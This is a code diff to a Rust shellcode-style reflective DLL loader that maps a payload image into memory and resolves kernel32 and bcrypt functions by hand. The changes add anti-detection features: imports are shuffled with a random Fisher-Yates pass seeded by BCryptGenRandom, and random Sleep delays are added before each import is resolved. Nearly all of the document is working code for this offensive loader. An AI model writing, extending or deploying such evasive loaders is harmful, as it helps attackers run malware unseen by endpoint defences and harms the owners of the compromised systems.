@@ -13,7 +13,8 @@ use core::{
 use windows_sys::{
     core::PWSTR,
     Win32::{
-        Foundation::{BOOL, HMODULE},
+        Foundation::{BOOL, HMODULE, STATUS_SUCCESS},
+        Security::Cryptography::BCRYPT_RNG_ALG_HANDLE,
         System::{
             Diagnostics::Debug::{
                 IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,
@@ -40,9 +41,11 @@ use windows_sys::{
 
 use crate::memory::*;
 
-// must be edited based on the number of imports in the IDT of the payload
-// const IMPORT_COUNT: usize = 100;
-// const MAX_IMPORT_DELAY_MS: u32 = 5000;
+// TODO: replace with parameters from the shellcode generator
+const SHUFFLE_IMPORTS: bool = true;
+const DELAY_IMPORTS: bool = true;
+
+const MAX_IMPORT_DELAY_MS: u64 = 2000;
 
 #[cfg(not(test))]
 #[panic_handler]
@@ -50,7 +53,12 @@ fn panic(_info: &core::panic::PanicInfo) -> ! {
     loop {}
 }
 
+// TODO: add to blog references
+// https://research.ijcaonline.org/volume113/number8/pxc3901710.pdf
+
 // TODO: check if i8 types can be replaced with u8 types (especially in pointers)
+
+// TODO: replace plain returns with Result<T, E> and propagate errors until panic in the loader function
 
 // TODO: remove _fltused and _DllMainCRTStartup (and uncomment DllMain) if deemed unnecessary after testing
 
@@ -89,12 +97,13 @@ pub unsafe extern "system" fn loader(
 
     let kernel32_base_ptr = get_module_ptr(KERNEL32_DLL).unwrap();
     let _ntdll_base_ptr = get_module_ptr(NTDLL_DLL).unwrap();
+    let bcrypt_base_ptr = get_module_ptr(BCRYPT_DLL).unwrap();
 
-    if kernel32_base_ptr.is_null() || _ntdll_base_ptr.is_null() {
+    if kernel32_base_ptr.is_null() || _ntdll_base_ptr.is_null() || bcrypt_base_ptr.is_null() {
         return;
     }
 
-    let far_procs = get_export_ptrs(kernel32_base_ptr).unwrap();
+    let far_procs = get_export_ptrs(kernel32_base_ptr, bcrypt_base_ptr).unwrap();
 
     /*
         2.) load the target image to a newly allocated permanent memory location with RW permissions
@@ -186,13 +195,17 @@ pub unsafe extern "system" fn loader(
     }
 }
 
-unsafe fn get_export_ptrs(kernel32_base_ptr: *mut u8) -> Option<FarProcs> {
+unsafe fn get_export_ptrs(
+    kernel32_base_ptr: *mut u8,
+    bcrypt_base_ptr: *mut u8,
+) -> Option<FarProcs> {
     let loadlib_addr = get_export_addr(kernel32_base_ptr, LOAD_LIBRARY_A).unwrap();
     let getproc_addr = get_export_addr(kernel32_base_ptr, GET_PROC_ADDRESS).unwrap();
     let virtualalloc_addr = get_export_addr(kernel32_base_ptr, VIRTUAL_ALLOC).unwrap();
     let virtualprotect_addr = get_export_addr(kernel32_base_ptr, VIRTUAL_PROTECT).unwrap();
     let flushcache_addr = get_export_addr(kernel32_base_ptr, FLUSH_INSTRUCTION_CACHE).unwrap();
     let sleep_addr = get_export_addr(kernel32_base_ptr, SLEEP).unwrap();
+    let bcrypt_genrandom_addr = get_export_addr(bcrypt_base_ptr, BCRYPT_GEN_RANDOM).unwrap();
 
     if loadlib_addr == 0
         || getproc_addr == 0
@@ -221,6 +234,9 @@ unsafe fn get_export_ptrs(kernel32_base_ptr: *mut u8) -> Option<FarProcs> {
     #[allow(non_snake_case)]
     let Sleep: Sleep = transmute(sleep_addr);
 
+    #[allow(non_snake_case)]
+    let BCryptGenRandom: BCryptGenRandom = transmute(bcrypt_genrandom_addr);
+
     Some(FarProcs {
         LoadLibraryA,
         GetProcAddress,
@@ -228,6 +244,7 @@ unsafe fn get_export_ptrs(kernel32_base_ptr: *mut u8) -> Option<FarProcs> {
         VirtualProtect,
         FlushInstructionCache,
         Sleep,
+        BCryptGenRandom,
     })
 }
 
@@ -424,12 +441,33 @@ unsafe fn patch_iat(
 ) {
     /*
         1.) shuffle Import Directory Table entries (image import descriptors)
-        2.) delay the relocation of each import a semirandom duration
+        2.) delay the relocation of each import a random duration
         3.) conditional execution based on ordinal/name
         4.) indirect function call via pointer
     */
 
-    // TODO: obfuscate the import handling (convert C++ obfuscation to Rust, preferably no_std)
+    let mut id_ptr = import_descriptor_ptr;
+    let mut import_count = 0;
+
+    while (*id_ptr).Name != 0 {
+        import_count += 1;
+        id_ptr = id_ptr.add(1);
+    }
+
+    let id_ptr = import_descriptor_ptr;
+
+    if import_count > 1 && SHUFFLE_IMPORTS {
+        // Fisher-Yates shuffle
+        for i in 0..import_count - 1 {
+            let rn = get_rn(far_procs).unwrap(); // TODO: replace with error propagation
+
+            let gap = import_count - i;
+            let j_u64 = i + (rn % gap);
+            let j = j_u64.min(import_count - 1);
+
+            id_ptr.offset(j as _).swap(id_ptr.offset(i as _));
+        }
+    }
 
     while (*import_descriptor_ptr).Name != 0x0 {
         let module_name_ptr = rva::<i8>(base_addr_ptr as _, (*import_descriptor_ptr).Name as usize);
@@ -442,6 +480,12 @@ unsafe fn patch_iat(
 
         if module_handle == 0 {
             return;
+        }
+
+        if DELAY_IMPORTS {
+            let rn = get_rn(far_procs).unwrap_or(0); // TODO: replace with error propagation
+            let delay = rn % MAX_IMPORT_DELAY_MS;
+            (far_procs.Sleep)(delay as _);
         }
 
         // RVA of the IAT via either OriginalFirstThunk or FirstThunk
@@ -562,6 +606,23 @@ unsafe fn finalize_relocations(
 
     // flush the instruction cache to ensure the CPU sees the changes made to the memory
     (far_procs.FlushInstructionCache)(-1, null_mut(), 0);
+}
+
+#[link_section = ".text"]
+unsafe fn get_rn(far_procs: &FarProcs) -> Option<u64> {
+    let mut buffer = [0u8; 8];
+    let status = (far_procs.BCryptGenRandom)(
+        BCRYPT_RNG_ALG_HANDLE,
+        buffer.as_mut_ptr(),
+        buffer.len() as _,
+        0,
+    );
+
+    if status != STATUS_SUCCESS {
+        return None;
+    }
+
+    Some(u64::from_le_bytes(buffer))
 }
 
 #[link_section = ".text"]
